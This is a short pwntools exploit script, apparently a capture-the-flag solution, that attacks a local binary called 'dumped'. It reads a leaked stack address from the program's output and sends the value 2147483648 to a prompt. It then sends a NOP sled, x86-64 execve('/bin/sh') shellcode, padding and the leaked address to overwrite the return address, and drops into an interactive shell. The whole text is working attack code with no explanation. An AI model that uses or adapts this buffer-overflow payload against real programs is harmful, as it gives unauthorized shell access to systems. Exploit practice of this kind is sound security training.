
import pwn
from pwn import *

p = process("./dumped")
context.binary = "dumped"
leak = p.recv(2653) [-14:]
leak = int(leak, base=16)
offset = 105


p.sendafter(b"throwing: ",b"2147483648")
shellcode = b"\x48\x31\xf6\x48\x31\xd2\x56\xb8\x3b\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x0f\x05"
payload = b''
payload = b'\x90'*20
payload += shellcode
payload += b"A"*57
payload += p64(leak)

p.send(payload)
p.interactive()
